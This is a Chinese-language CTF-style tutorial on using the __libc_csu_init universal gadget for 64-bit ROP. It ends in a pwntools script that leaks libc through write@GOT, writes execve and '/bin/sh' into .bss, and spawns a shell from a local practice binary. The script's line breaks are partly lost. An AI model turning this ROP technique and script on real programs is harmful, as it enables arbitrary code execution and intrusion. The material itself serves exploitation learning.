64位通用gadget就是在程序中都存在的gadget，我们通过对这些gadget的利用达成对寄存器的控制


| __libc_csu_init|


64位通用gadget位于函数__libc_csu_init函数中，这个函数是程序调用libc库用来对程序进行初始化的函数，一般会在main函数前就执行


↑通用gadget↑



| 利用方式 |

构造ROP的核心步骤包括三点：
  1. 获得用于获取shell的库函数地址
  2. 安排该库函数在合适的位置被调用
  3. 如何巧妙的向函数传参数

↑溢出后的排布方式↑


在64位程序中，当参数少于七个时，参数从左到右放入寄存器：rdi，rsi，rdx，rcx，r8，r9

  • 在gadget2中利用call来调用地址r12+rbx*8指向的函数，如果设置rbx为0，就变成了调用寄存器r12指向的函数
  • 在64为程序前三个输入参数的寄存器rdi，rsi，rdx，可以从r15，r14，r13中获取，从gadget1中可知这三个寄存器的值可从栈中获取




| 一个小技巧|

从第一张图中可以看到，在call一个函数后还会回来继续执行gadget2后面的东西，也就是说在一定条件下还会去再次执行gadget1

从汇编语言中我们可以得知这个条件就是要绕过jnz
就是要把rbp设置为1

#-- coding: utf-8 --from pwn import *

p=process('./pwn8')elf=ELF('./pwn8')libc=ELF('./libc.so')



context.log_level='debug'

if args.G:    gdb.attach(p)

csu_end=0x00400606csu_start=0x04005F0

def csu(rbx,rbp,r12,r13,r14,r15,last):#创建函数，利用函数的参数控制寄存器

    pay='a'*0x80+'b'*0x8#paylod数量0x80个，加上8个rbp

    pay+=p64(csu_end)    pay+=p64(0)#这里需要多加8个字符是因为r15开始读取的时候还要偏移8个    pay+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)#排入当时进入这个函数的时候的参数，主要目的应该是为了利用参数排列plt和got或者是execve和/bin/sh    pay+=p64(csu_start)    pay+='d'*0x38#执行完call后会继续往后执行，这里是为了填补那个add rsp，0x38    pay+=p64(last)    p.sendline(pay)    sleep(1)#慢点发送，防止发的时间不对,因为是在return中的read





main_addr=elf.symbols['main']read_got=elf.got['read']write_got=elf.got['write']bss_base=elf.bss()

p.recvuntil('Hello, World\n')

csu(0,1,write_got,1,write_got,8,main_addr)

write_addr=u64(p.recv(8))print("write_addr:"+hex(write_addr))libc_base=write_addr-libc.symbols['write']print("libc_base:"+hex(libc_base))execve_addr=libc_base+libc.symbols['execve']print("execve_addr:"+hex(execve_addr))



#第二次溢出-利用read函数把/bin/sh和execve的地址写入到bss段中p.recvuntil('Hello, World\n')csu(0,1,read_got,0,bss_base,16,main_addr)

p.send(p64(execve_addr)+'/bin/sh\x00')

#第三次溢出，利用csu函数执行systemp.recvuntil('Hello, World\n')csu(0,1,bss_base,bss_base+8,0,0,0)

p.interactive()
